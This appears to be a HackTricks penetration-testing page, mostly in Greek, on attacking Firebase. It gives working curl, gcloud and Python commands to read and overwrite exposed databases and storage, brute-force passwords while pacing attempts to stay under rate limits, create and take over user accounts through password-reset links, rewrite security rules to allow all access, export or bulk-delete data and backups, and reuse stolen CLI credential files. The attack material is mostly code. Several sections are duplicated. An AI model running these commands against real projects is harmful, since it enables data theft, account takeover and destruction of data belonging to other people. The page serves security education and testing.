# GCP - Firebase Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Firebase

### Μη αυθεντικοποιημένη πρόσβαση στο Firebase Realtime Database
Ένας attacker δεν χρειάζεται κανένα συγκεκριμένο δικαίωμα στο Firebase για να πραγματοποιήσει αυτό το attack. Απαιτείται μόνο να υπάρχει ευάλωτη διαμόρφωση στους κανόνες ασφαλείας του Firebase Realtime Database, όπου οι κανόνες έχουν οριστεί με `.read: true` ή `.write: true`, επιτρέποντας δημόσια ανάγνωση ή εγγραφή.

Ο attacker πρέπει να εντοπίσει το URL της βάσης δεδομένων, που συνήθως ακολουθεί τη μορφή: `https://<project-id>.firebaseio.com/`.

Αυτό το URL μπορεί να βρεθεί μέσω mobile application reverse engineering (decompiling Android APKs or analyzing iOS apps), αναλύοντας αρχεία διαμόρφωσης όπως google-services.json (Android) ή GoogleService-Info.plist (iOS), εξετάζοντας τον πηγαίο κώδικα web εφαρμογών, ή αναλύοντας την κυκλοφορία δικτύου για να εντοπιστούν αιτήσεις προς domains `*.firebaseio.com`.

Ο attacker εντοπίζει το URL της βάσης και ελέγχει αν είναι δημόσια εκτεθειμένο, στη συνέχεια προσπελαύνει τα δεδομένα και ενδεχομένως γράφει κακόβουλες πληροφορίες.

Πρώτα, ελέγχουν αν η βάση επιτρέπει πρόσβαση ανάγνωσης προσθέτοντας .json στο URL.
```bash
curl https://<project-id>-default-rtdb.firebaseio.com/.json
```
Εάν η απάντηση περιέχει δεδομένα JSON ή null (αντί για "Permission Denied"), η βάση δεδομένων επιτρέπει πρόσβαση ανάγνωσης. Για να ελέγξει την πρόσβαση εγγραφής, ο attacker μπορεί να προσπαθήσει να στείλει ένα δοκιμαστικό αίτημα εγγραφής χρησιμοποιώντας το Firebase REST API.
```bash
curl -X PUT https://<project-id>-default-rtdb.firebaseio.com/test.json -d '{"test": "data"}'
```
Αν η λειτουργία επιτύχει, η βάση δεδομένων επιτρέπει επίσης πρόσβαση εγγραφής.


### Έκθεση δεδομένων στο Cloud Firestore
Ένας attacker δεν χρειάζεται καμία συγκεκριμένη Firebase permissions για να εκτελέσει αυτή την επίθεση. Απαιτείται μόνο να υπάρχει μια ευάλωτη διαμόρφωση στους κανόνες ασφαλείας του Cloud Firestore όπου οι κανόνες επιτρέπουν πρόσβαση ανάγνωσης ή εγγραφής χωρίς αυθεντικοποίηση ή με ανεπαρκή επικύρωση. Ένα παράδειγμα κακώς διαμορφωμένου κανόνα που χορηγεί πλήρη πρόσβαση είναι:
```bash
service cloud.firestore {
match /databases/{database}/documents/{document=**} {
allow read, write: if true;
}
}
```
Αυτός ο κανόνας επιτρέπει σε οποιονδήποτε να διαβάζει και να γράφει όλα τα έγγραφα χωρίς περιορισμούς. Οι κανόνες του Firestore είναι λεπτομερείς και εφαρμόζονται ανά συλλογή και έγγραφο, οπότε ένα σφάλμα σε έναν συγκεκριμένο κανόνα μπορεί να εκθέσει μόνο ορισμένες συλλογές.

Ο επιτιθέμενος πρέπει να εντοπίσει το Firebase Project ID, το οποίο μπορεί να βρεθεί μέσω mobile app reverse engineering, ανάλυσης αρχείων ρυθμίσεων όπως google-services.json ή GoogleService-Info.plist, επιθεώρησης του πηγαίου κώδικα web εφαρμογών, ή ανάλυσης της δικτυακής κίνησης για τον εντοπισμό αιτήσεων προς firestore.googleapis.com.

Το Firestore REST API χρησιμοποιεί τη μορφή:
```bash
https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
Εάν οι κανόνες επιτρέπουν μη αυθεντικοποιημένη πρόσβαση ανάγνωσης, ο επιτιθέμενος μπορεί να διαβάσει συλλογές και έγγραφα. Πρώτα, προσπαθούν να αποκτήσουν πρόσβαση σε μια συγκεκριμένη συλλογή:
```bash
curl https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>
```
Εάν η απάντηση περιέχει JSON έγγραφα αντί για σφάλμα δικαιωμάτων, η συλλογή είναι εκτεθειμένη. Ο επιτιθέμενος μπορεί να απαριθμήσει όλες τις προσβάσιμες συλλογές δοκιμάζοντας συνηθισμένα ονόματα ή αναλύοντας τη δομή της εφαρμογής. Για να αποκτήσει πρόσβαση σε ένα συγκεκριμένο έγγραφο:
```bash
curl https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
Εάν οι κανόνες επιτρέπουν unauthenticated write access ή έχουν ανεπαρκή επικύρωση, ο attacker μπορεί να δημιουργήσει νέα έγγραφα:
```bash
curl -X POST https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection> \
-H "Content-Type: application/json" \
-d '{
"fields": {
"name": {"stringValue": "Test"},
"email": {"stringValue": "test@example.com"}
}
}'
```
Για να τροποποιήσετε ένα υπάρχον έγγραφο πρέπει να χρησιμοποιήσετε PATCH:
```bash
curl -X PATCH https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/users/<user-id> \
-H "Content-Type: application/json" \
-d '{
"fields": {
"role": {"stringValue": "admin"}
}
}'
```
Για να διαγράψετε ένα έγγραφο και να προκαλέσετε άρνηση υπηρεσίας:
```bash
curl -X DELETE https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
### Exposure of files in Firebase Storage
Ένας επιτιθέμενος δεν χρειάζεται ειδικές άδειες Firebase για να εκτελέσει αυτήν την επίθεση. Απαιτεί μόνο ότι υπάρχει μια ευάλωτη διαμόρφωση στους κανόνες ασφαλείας του Firebase Storage όπου οι κανόνες επιτρέπουν πρόσβαση ανάγνωσης ή εγγραφής χωρίς αυθεντικοποίηση ή με ανεπαρκή επικύρωση. Οι Storage rules ελέγχουν τις άδειες ανάγνωσης και εγγραφής ανεξάρτητα, οπότε ένα σφάλμα σε έναν κανόνα μπορεί να εκθέσει μόνο πρόσβαση ανάγνωσης, μόνο πρόσβαση εγγραφής, ή και τα δύο. Ένα παράδειγμα εσφαλμένα διαμορφωμένου κανόνα που παραχωρεί πλήρη πρόσβαση είναι:
```bash
service cloud.firestore {
match /databases/{database}/documents/{document=**} {
allow read, write: if true;
}
}
```
Αυτός ο κανόνας επιτρέπει πρόσβαση ανάγνωσης και εγγραφής σε όλα τα έγγραφα χωρίς περιορισμούς. Οι κανόνες του Firestore είναι λεπτομερείς και εφαρμόζονται ανά συλλογή και ανά έγγραφο, οπότε ένα σφάλμα σε έναν συγκεκριμένο κανόνα μπορεί να εκθέσει μόνο ορισμένες συλλογές. Ο επιτιθέμενος πρέπει να εντοπίσει το Firebase Project ID, το οποίο μπορεί να βρεθεί μέσω mobile application reverse engineering, ανάλυσης αρχείων διαμόρφωσης όπως google-services.json ή GoogleService-Info.plist, επιθεώρησης του web application source code, ή ανάλυσης δικτυακής κυκλοφορίας για να εντοπιστούν αιτήματα προς firestore.googleapis.com.

Το Firestore REST API χρησιμοποιεί τη μορφή: `https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>.`

Εάν οι κανόνες επιτρέπουν πρόσβαση ανάγνωσης χωρίς αυθεντικοποίηση, ο επιτιθέμενος μπορεί να διαβάσει συλλογές και έγγραφα. Αρχικά, προσπαθεί να αποκτήσει πρόσβαση σε μια συγκεκριμένη συλλογή.
```bash
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o"
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o?prefix=<path>"
```
Εάν η απάντηση περιέχει τη λίστα αρχείων αντί για σφάλμα δικαιωμάτων, το αρχείο είναι εκτεθειμένο. Ο επιτιθέμενος μπορεί να δει τα περιεχόμενα των αρχείων καθορίζοντας τη διαδρομή τους:
```bash
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o/<urlencode(path)>"
```
Εάν οι κανόνες επιτρέπουν μη αυθεντικοποιημένη πρόσβαση εγγραφής ή έχουν ανεπαρκή επικύρωση, ο επιτιθέμενος μπορεί να ανεβάσει κακόβουλα αρχεία. Για να ανεβάσετε ένα αρχείο μέσω του REST API:
```bash
curl -X POST "https://firebasestorage.googleapis.com/v0/b/<bucket>/o?name=<path>" \
-H "Content-Type: <content-type>" \
--data-binary @<local-file>
```
Ο επιτιθέμενος μπορεί να ανεβάσει code shells, malware payloads ή μεγάλα αρχεία για να προκαλέσει denial of service. Εάν η εφαρμογή επεξεργάζεται ή εκτελεί τα ανεβασμένα αρχεία, ο επιτιθέμενος μπορεί να επιτύχει remote code execution. Για να διαγράψει αρχεία και να προκαλέσει denial of service:
```bash
curl -X DELETE "https://firebasestorage.googleapis.com/v0/b/<bucket>/o/<path>"
```
### Κλήση δημόσιων Firebase Cloud Functions
Ένας επιτιθέμενος δεν χρειάζεται ειδικές άδειες Firebase για να εκμεταλλευτεί αυτό το ζήτημα· απαιτείται μόνο το Cloud Function να είναι δημόσια προσβάσιμο μέσω HTTP χωρίς έλεγχο ταυτότητας.

Μια Cloud Function είναι ευάλωτη όταν είναι ανασφαλώς διαμορφωμένη:

- Χρησιμοποιεί functions.https.onRequest, που δεν επιβάλλει έλεγχο ταυτότητας (σε αντίθεση με τις onCall functions).
- Ο κώδικας της function δεν επικυρώνει την ταυτότητα του χρήστη (π.χ. δεν υπάρχουν έλεγχοι για request.auth ή context.auth).
- Η function είναι δημόσια προσβάσιμη στο IAM, δηλαδή το allUsers έχει το roles/cloudfunctions.invoker role. Αυτή είναι η προεπιλεγμένη συμπεριφορά για HTTP functions εκτός αν ο developer περιορίσει την πρόσβαση.

Firebase HTTP Cloud Functions εκτίθενται μέσω URL όπως:

- https://<region>-<project-id>.cloudfunctions.net/<function-name>
- https://<project-id>.web.app/<function-name> (when integrated with Firebase Hosting)

Ένας επιτιθέμενος μπορεί να ανακαλύψει αυτά τα URLs μέσω source code analysis, network traffic inspection, enumeration tools, ή mobile app reverse engineering.
Αν η function είναι δημόσια εκτεθειμένη και χωρίς έλεγχο ταυτότητας, ο επιτιθέμενος μπορεί να την καλέσει απευθείας χωρίς credentials.
```bash
# Invoke public HTTP function with GET
curl "https://<region>-<project-id>.cloudfunctions.net/<function-name>"
# Invoke public HTTP function with POST and data
curl -X POST "https://<region>-<project-id>.cloudfunctions.net/<function-name>" \
-H "Content-Type: application/json" \
-d '{"param1": "value1", "param2": "value2"}'
```
If the function does not properly validate inputs, the attacker may attempt other attacks such as code injection or command injection.

### Brute-force attack against Firebase Authentication με αδύναμη πολιτική κωδικών
Ένας επιτιθέμενος δεν χρειάζεται συγκεκριμένα δικαιώματα στο Firebase για να πραγματοποιήσει αυτή την επίθεση. Αρκεί το Firebase API Key να είναι εκτεθειμένο σε mobile ή web εφαρμογές, και η πολιτική κωδικών να μην έχει ρυθμιστεί με πιο αυστηρές απαιτήσεις από τις προεπιλογές.

Ο επιτιθέμενος πρέπει να εντοπίσει το Firebase API Key, το οποίο μπορεί να βρεθεί μέσω reverse engineering της mobile app, ανάλυσης αρχείων ρυθμίσεων όπως google-services.json ή GoogleService-Info.plist, επιθεώρησης του source code των web εφαρμογών (π.χ. σε bootstrap.js), ή ανάλυσης του network traffic.

Το REST API του Firebase Authentication χρησιμοποιεί το endpoint:
`https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>`
για authentication με email και password.

If Email Enumeration Protection is disabled, API error responses can reveal whether an email exists in the system (EMAIL_NOT_FOUND vs. INVALID_PASSWORD), which allows attackers to enumerate users before attempting password guessing. When this protection is enabled, the API returns the same error message for both nonexistent emails and incorrect passwords, preventing user enumeration.

Είναι σημαντικό να σημειωθεί ότι το Firebase Authentication επιβάλλει rate limiting, το οποίο μπορεί να μπλοκάρει αιτήσεις αν πραγματοποιηθούν πάρα πολλές προσπάθειες authentication σε σύντομο χρονικό διάστημα. Για αυτόν τον λόγο, ένας επιτιθέμενος θα έπρεπε να εισάγει καθυστερήσεις μεταξύ των προσπαθειών για να αποφύγει το rate-limited.

Ο επιτιθέμενος εντοπίζει το API Key και πραγματοποιεί προσπάθειες authentication με πολλούς κωδικούς απέναντι σε γνωστούς λογαριασμούς. If Email Enumeration Protection is disabled, the attacker can enumerate existing users by analyzing the error responses:
```bash
# Attempt authentication with a known email and an incorrect password
curl -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
-H "Content-Type: application/json" \
-d '{
"email": "usuario@example.com",
"password": "password",
"returnSecureToken": true
}'
```
Αν η απάντηση περιέχει EMAIL_NOT_FOUND, το email δεν υπάρχει στο σύστημα. Αν περιέχει INVALID_PASSWORD, το email υπάρχει αλλά ο κωδικός είναι λανθασμένος, επιβεβαιώνοντας ότι ο χρήστης είναι εγγεγραμμένος. Μόλις εντοπιστεί ένας έγκυρος χρήστης, ο attacker μπορεί να εκτελέσει brute-force attempts. Είναι σημαντικό να συμπεριλαμβάνονται παύσεις μεταξύ των προσπαθειών για να αποφευχθούν οι rate-limiting mechanisms του Firebase Authentication:
```bash
counter=1
for password in $(cat wordlist.txt); do
echo "Intento $counter: probando contraseña '$password'"
response=$(curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
-H "Content-Type: application/json" \
-d "{\"email\":\"usuario@example.com\",\"password\":\"$password\",\"returnSecureToken\":true}")

if echo "$response" | grep -q "idToken"; then
echo "Contraseña encontrada: $password (intento $counter)"
break
fi

# Stop for the rate limiting
sleep 1
counter=$((counter + 1))
done
```
With the default password policy (minimum 6 characters, no complexity requirements), the attacker can try all possible combinations of 6-character passwords, which represents a relatively small search space compared to stricter password policies.

### Διαχείριση χρηστών στο Firebase Authentication

Ο attacker χρειάζεται συγκεκριμένα δικαιώματα του Firebase Authentication για να πραγματοποιήσει αυτή την επίθεση. Τα απαραίτητα permissions είναι:

- `firebaseauth.users.create` to create users
- `firebaseauth.users.update` to modify existing users
- `firebaseauth.users.delete` to delete users
- `firebaseauth.users.get` to retrieve user information
- `firebaseauth.users.sendEmail` to send emails to users
- `firebaseauth.users.createSession` to create user sessions

Αυτά τα permissions περιλαμβάνονται στον ρόλο `roles/firebaseauth.admin`, ο οποίος παρέχει πλήρη read/write access στα Firebase Authentication resources. Επίσης περιλαμβάνονται σε ρόλους υψηλότερου επιπέδου όπως roles/firebase.developAdmin (which includes all firebaseauth.* permissions) και roles/firebase.admin (full access to all Firebase services).

Για να χρησιμοποιήσει το Firebase Admin SDK, ο attacker θα χρειαστεί πρόσβαση σε service account credentials (JSON file), τα οποία μπορεί να βρεθούν σε compromised systems, δημόσια εκτεθειμένα code repositories, compromised CI/CD systems, ή μέσω παραβίασης developer accounts που έχουν πρόσβαση σε αυτά τα credentials.

Το πρώτο βήμα είναι να διαμορφώσετε το Firebase Admin SDK χρησιμοποιώντας service account credentials.
```bash
import firebase_admin
from firebase_admin import credentials, auth
cred = credentials.Certificate('path/to/serviceAccountKey.json')
firebase_admin.initialize_app(cred)
```
Για να δημιουργήσει έναν κακόβουλο χρήστη χρησιμοποιώντας τη διεύθυνση email του θύματος, ο επιτιθέμενος θα επιχειρούσε να χρησιμοποιήσει το Firebase Admin SDK για να δημιουργήσει έναν νέο λογαριασμό με αυτή τη διεύθυνση.
```bash
user = auth.create_user(
email='victima@example.com',
email_verified=False,
password='password123',
display_name='Usuario Malicioso',
disabled=False
)
print(f'Usuario creado: {user.uid}')
```
Για να τροποποιήσει έναν υπάρχοντα χρήστη, ο επιτιθέμενος θα ενημέρωνε πεδία όπως η διεύθυνση email, η κατάσταση επαλήθευσης ή αν ο λογαριασμός είναι απενεργοποιημένος.
```bash
user = auth.update_user(
uid,
email='nuevo-email@example.com',
email_verified=True,
disabled=False
)
print(f'Usuario actualizado: {user.uid}')
```
Για να διαγράψει έναν λογαριασμό χρήστη και να προκαλέσει άρνηση υπηρεσίας, ο επιτιθέμενος θα έστελνε ένα αίτημα για την πλήρη διαγραφή του χρήστη.
```bash
auth.delete_user(uid)
print('Usuario eliminado exitosamente')
```
Ο επιτιθέμενος μπορεί επίσης να ανακτήσει πληροφορίες για υπάρχοντες χρήστες ζητώντας το UID ή το email address τους.
```bash
user = auth.get_user(uid)
print(f'Información del usuario: {user.uid}, {user.email}')
user = auth.get_user_by_email('usuario@example.com')
print(f'Información del usuario: {user.uid}, {user.email}')
```
Επιπλέον, ο επιτιθέμενος θα μπορούσε να δημιουργήσει συνδέσμους επαλήθευσης ή συνδέσμους επαναφοράς κωδικού προκειμένου να αλλάξει τον κωδικό ενός χρήστη και να αποκτήσει πρόσβαση στον λογαριασμό του.
```bash
link = auth.generate_email_verification_link(email)
print(f'Link de verificación: {link}')
link = auth.generate_password_reset_link(email)
print(f'Link de reset: {link}')
```
### Διαχείριση χρηστών στο Firebase Authentication
Ένας επιτιθέμενος χρειάζεται συγκεκριμένα δικαιώματα του Firebase Authentication για να πραγματοποιήσει αυτή την επίθεση. Τα απαιτούμενα δικαιώματα είναι:

- `firebaseauth.users.create` για τη δημιουργία χρηστών
- `firebaseauth.users.update` για την τροποποίηση υπαρχόντων χρηστών
- `firebaseauth.users.delete` για τη διαγραφή χρηστών
- `firebaseauth.users.get` για την απόκτηση πληροφοριών χρήστη
- `firebaseauth.users.sendEmail` για την αποστολή email σε χρήστες
- `firebaseauth.users.createSession` για τη δημιουργία συνεδριών χρήστη

Αυτά τα δικαιώματα περιλαμβάνονται στο ρόλο roles/firebaseauth.admin, ο οποίος παρέχει πλήρη πρόσβαση ανάγνωσης/εγγραφής στους πόρους του Firebase Authentication. Είναι επίσης μέρος ρόλων υψηλότερου επιπέδου όπως `roles/firebase.developAdmin` (που περιλαμβάνει όλα τα firebaseauth.* δικαιώματα) και `roles/firebase.admin` (πλήρης πρόσβαση σε όλες τις υπηρεσίες Firebase).

Για να χρησιμοποιήσει το Firebase Admin SDK, ο επιτιθέμενος θα χρειαστεί πρόσβαση σε service account credentials (a JSON file), τα οποία μπορούν να αποκτηθούν από παραβιασμένα συστήματα, δημόσια εκτεθειμένα αποθετήρια κώδικα, παραβιασμένα CI/CD περιβάλλοντα, ή μέσω παραβίασης λογαριασμών developers που έχουν πρόσβαση σε αυτά τα credentials.

Το πρώτο βήμα είναι να διαμορφώσετε το Firebase Admin SDK χρησιμοποιώντας τα service account credentials.
```bash
import firebase_admin
from firebase_admin import credentials, auth
cred = credentials.Certificate('path/to/serviceAccountKey.json')
firebase_admin.initialize_app(cred)
```
Για να δημιουργήσει έναν κακόβουλο χρήστη χρησιμοποιώντας το email του θύματος, ο επιτιθέμενος θα επιχειρούσε να δημιουργήσει έναν νέο λογαριασμό χρήστη με αυτό το email, εκχωρώντας τον δικό του κωδικό πρόσβασης και πληροφορίες προφίλ.
```bash
user = auth.create_user(
email='victima@example.com',
email_verified=False,
password='password123',
display_name='Usuario Malicioso',
disabled=False
)
print(f'Usuario creado: {user.uid}')
```
Για να τροποποιήσει έναν υπάρχοντα χρήστη, ο επιτιθέμενος θα άλλαζε πεδία όπως η διεύθυνση email, η κατάσταση επαλήθευσης ή το αν ο λογαριασμός είναι απενεργοποιημένος.
```bash
user = auth.update_user(
uid,
email='nuevo-email@example.com',
email_verified=True,
disabled=False
)
print(f'Usuario actualizado: {user.uid}')
```
Για να διαγράψει έναν λογαριασμό χρήστη—πρακτικά προκαλώντας άρνηση υπηρεσίας—ο επιτιθέμενος θα αποστείλει ένα αίτημα για να διαγράψει μόνιμα αυτόν τον χρήστη.
```bash
auth.delete_user(uid)
print('Usuario eliminado exitosamente')
```
Ο επιτιθέμενος θα μπορούσε επίσης να ανακτήσει πληροφορίες για υπάρχοντες χρήστες, όπως το UID ή το email τους, ζητώντας λεπτομέρειες χρήστη είτε με UID είτε με διεύθυνση email.
```bash
user = auth.get_user(uid)
print(f'Información del usuario: {user.uid}, {user.email}')
user = auth.get_user_by_email('usuario@example.com')
print(f'Información del usuario: {user.uid}, {user.email}')
```
Επιπλέον, ο επιτιθέμενος θα μπορούσε να δημιουργήσει verification links ή password-reset links, επιτρέποντάς του να αλλάξει τον κωδικό πρόσβασης ενός χρήστη και να αναλάβει τον έλεγχο του λογαριασμού.
```bash
link = auth.generate_email_verification_link(email)
print(f'Link de verificación: {link}')
link = auth.generate_password_reset_link(email)
print(f'Link de reset: {link}')
```
### Modification of security rules in Firebase services
Ο επιτιθέμενος χρειάζεται συγκεκριμένες άδειες για να τροποποιήσει τους κανόνες ασφαλείας ανάλογα με την υπηρεσία. Για το Cloud Firestore και το Firebase Cloud Storage, οι απαιτούμενες άδειες είναι `firebaserules.rulesets.create` για τη δημιουργία των rulesets και `firebaserules.releases.create` για την ανάπτυξη των releases. Αυτές οι άδειες περιλαμβάνονται στο role `roles/firebaserules.admin` ή σε ανώτερα roles όπως `roles/firebase.developAdmin` και `roles/firebase.admin`. Για το Firebase Realtime Database, η απαιτούμενη άδεια είναι `firebasedatabase.instances.update`.

Ο επιτιθέμενος πρέπει να χρησιμοποιήσει το Firebase REST API για να τροποποιήσει τους κανόνες ασφαλείας.
Πρώτα, ο επιτιθέμενος θα πρέπει να αποκτήσει ένα access token χρησιμοποιώντας service account credentials.
Για να αποκτήσει το token:
```bash
gcloud auth activate-service-account --key-file=path/to/serviceAccountKey.json
ACCESS_TOKEN=$(gcloud auth print-access-token)
```
Για να τροποποιήσετε τους κανόνες του Firebase Realtime Database:
```bash
curl -X PUT "https://<project-id>-default-rtdb.firebaseio.com/.settings/rules.json?access_token=$ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"rules": {
".read": true,
".write": true
}
}'
```
Για να τροποποιήσει τους κανόνες του Cloud Firestore, ο επιτιθέμενος πρέπει να δημιουργήσει ένα ruleset και στη συνέχεια να το αναπτύξει:
```bash
curl -X POST "https://firebaserules.googleapis.com/v1/projects/<project-id>/rulesets" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"source": {
"files": [{
"name": "firestore.rules",
"content": "rules_version = '\''2'\'';\nservice cloud.firestore {\n  match /databases/{database}/documents {\n    match /{document=**} {\n      allow read, write: if true;\n    }\n  }\n}"
}]
}
}'
```
Η προηγούμενη εντολή επιστρέφει το όνομα του ruleset με τη μορφή projects/<project-id>/rulesets/<ruleset-id>. Για να αναπτυχθεί η νέα έκδοση, το release πρέπει να ενημερωθεί χρησιμοποιώντας ένα PATCH request:
```bash
curl -X PATCH "https://firebaserules.googleapis.com/v1/projects/<project-id>/releases/cloud.firestore" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"release": {
"name": "projects/<project-id>/releases/cloud.firestore",
"rulesetName": "projects/<project-id>/rulesets/<ruleset-id>"
}
}'
```
Για να τροποποιήσετε τους κανόνες του Firebase Cloud Storage:
```bash
curl -X POST "https://firebaserules.googleapis.com/v1/projects/<project-id>/rulesets" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"source": {
"files": [{
"name": "storage.rules",
"content": "service firebase.storage {\n  match /b/{bucket}/o {\n    match /{allPaths=**} {\n      allow read, write: if true;\n    }\n  }\n}"
}]
}
}'
```
Η προηγούμενη εντολή επιστρέφει ένα όνομα ruleset στη μορφή projects/<project-id>/rulesets/<ruleset-id>. Για να αναπτυχθεί η νέα έκδοση, το release πρέπει να ενημερωθεί χρησιμοποιώντας ένα PATCH request:
```bash
curl -X PATCH "https://firebaserules.googleapis.com/v1/projects/<project-id>/releases/firebase.storage/<bucket-id>" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"release": {
"name": "projects/<project-id>/releases/firebase.storage/<bucket-id>",
"rulesetName": "projects/<project-id>/rulesets/<ruleset-id>"
}
}'
```
### Data exfiltration και χειρισμός στο Cloud Firestore
Cloud Firestore χρησιμοποιεί την ίδια υποδομή και το ίδιο σύστημα δικαιωμάτων με το Cloud Datastore, οπότε τα Datastore IAM permissions εφαρμόζονται άμεσα στο Firestore. Για να χειριστεί κανείς TTL policies απαιτείται το permission `datastore.indexes.update`. Για εξαγωγή δεδομένων απαιτείται το permission `datastore.databases.export`. Για εισαγωγή δεδομένων απαιτείται το permission `datastore.databases.import`. Για μαζική διαγραφή δεδομένων απαιτείται το permission `datastore.databases.bulkDelete`.

Για λειτουργίες backup και restore χρειάζονται συγκεκριμένα permissions:

- `datastore.backups.get` και `datastore.backups.list` για να απαριθμήσετε και να ανακτήσετε λεπτομέρειες των διαθέσιμων backups
- `datastore.backups.delete` για να διαγράψετε backups
- `datastore.backups.restoreDatabase` για να επαναφέρετε μια βάση δεδομένων από backup
- `datastore.backupSchedules.create` και `datastore.backupSchedules.delete` για τη διαχείριση των χρονοδιαγραμμάτων backup

Όταν δημιουργείται μια TTL policy, επιλέγεται μια συγκεκριμένη ιδιότητα (property) για να εντοπίζει οντότητες που είναι επιλέξιμες για διαγραφή. Αυτή η TTL property πρέπει να είναι τύπου Ημερομηνία και ώρα. Ο επιτιθέμενος μπορεί να επιλέξει μια ιδιότητα που υπάρχει ήδη ή να ορίσει μια ιδιότητα που σκοπεύει να προσθέσει αργότερα. Αν η τιμή του πεδίου είναι ημερομηνία στο παρελθόν, το document γίνεται επιλέξιμο για άμεση διαγραφή. Ο επιτιθέμενος μπορεί να χρησιμοποιήσει το gcloud CLI για να χειριστεί TTL policies.
```bash
# Enable TTL
gcloud firestore fields ttls update expireAt \
--collection-group=users \
--enable-ttl
# Disable TTL
gcloud firestore fields ttls update expireAt \
--collection-group=users \
--disable-ttl
```
Για να εξάγει δεδομένα και να τα exfiltrate, ο επιτιθέμενος θα μπορούσε να χρησιμοποιήσει το gcloud CLI.
```bash
gcloud firestore export gs://<bucket-name> --project=<project-id> --async --database='(default)'
```
Για να εισαγάγετε κακόβουλα δεδομένα:
```bash
gcloud firestore import gs://<bucket-name>/<path> --project=<project-id> --async --database='(default)'
```
Για να πραγματοποιήσει μαζική διαγραφή δεδομένων και να προκαλέσει denial of service, ο επιτιθέμενος θα μπορούσε να χρησιμοποιήσει το gcloud Firestore bulk-delete tool για να αφαιρέσει ολόκληρες συλλογές.
```bash
gcloud firestore bulk-delete \
--collection-ids=users,posts,messages \
--database='(default)' \
--project=<project-id>
```
Για λειτουργίες δημιουργίας αντιγράφων ασφαλείας και αποκατάστασης, ο επιτιθέμενος θα μπορούσε να δημιουργήσει προγραμματισμένα αντίγραφα ασφαλείας για να καταγράψει την τρέχουσα κατάσταση της βάσης δεδομένων, να απαριθμήσει τα υπάρχοντα αντίγραφα ασφαλείας, να επαναφέρει από ένα αντίγραφο ασφαλείας για να αντικαταστήσει πρόσφατες αλλαγές, να διαγράψει αντίγραφα ασφαλείας για να προκαλέσει μόνιμη απώλεια δεδομένων και να αφαιρέσει προγραμματισμένα αντίγραφα ασφαλείας.
Για να δημιουργήσει ένα ημερήσιο πρόγραμμα αντιγράφων ασφαλείας που θα δημιουργεί αμέσως ένα αντίγραφο ασφαλείας:
```bash
gcloud firestore backups schedules create \
--database='(default)' \
--recurrence=daily \
--retention=14w \
--project=<project-id>
```
Για να επαναφέρει δεδομένα από ένα συγκεκριμένο αντίγραφο ασφαλείας, ο επιτιθέμενος θα μπορούσε να δημιουργήσει μια νέα βάση δεδομένων χρησιμοποιώντας τα δεδομένα που περιέχονται σε αυτό το αντίγραφο. Η λειτουργία επαναφοράς γράφει τα δεδομένα του αντιγράφου ασφαλείας σε μια νέα βάση δεδομένων, που σημαίνει ότι ένα υπάρχον DATABASE_ID δεν μπορεί να χρησιμοποιηθεί.
```bash
gcloud firestore databases restore \
--source-backup=projects/<project-id>/locations/<location>/backups/<backup-id> \
--destination-database='<new-database-id>' \
--project=<project-id>
```
Για να διαγράψετε ένα backup και να προκαλέσετε μόνιμη απώλεια δεδομένων:
```bash
gcloud firestore backups delete \
--backup=<backup-id> \
--project=<project-id>
```
### Κλοπή και κατάχρηση των Firebase CLI credentials
Ένας attacker δεν χρειάζεται συγκεκριμένα Firebase permissions για να πραγματοποιήσει αυτή την επίθεση, αλλά απαιτείται πρόσβαση στο τοπικό σύστημα του developer ή στο Firebase CLI credentials file. Αυτά τα credentials αποθηκεύονται σε ένα αρχείο JSON που βρίσκεται στη διαδρομή:

- Linux/macOS: ~/.config/configstore/firebase-tools.json

- Windows: C:\Users\[User]\.config\configstore\firebase-tools.json

Αυτό το αρχείο περιέχει authentication tokens, συμπεριλαμβανομένων των refresh_token και access_token, που επιτρέπουν στον attacker να αυθεντικοποιηθεί ως ο χρήστης που αρχικά εκτέλεσε το firebase login.

Ο attacker αποκτά πρόσβαση στο Firebase CLI credentials file. Μπορεί στη συνέχεια να αντιγράψει ολόκληρο το αρχείο στο δικό του σύστημα, και το Firebase CLI θα χρησιμοποιήσει αυτόματα τα credentials από την προεπιλεγμένη τοποθεσία του. Αφού το κάνει αυτό, ο attacker μπορεί να δει όλα τα Firebase projects που είναι προσβάσιμα από εκείνον τον χρήστη.
```bash
firebase projects:list
```
{{#include ../../../banners/hacktricks-training.md}}
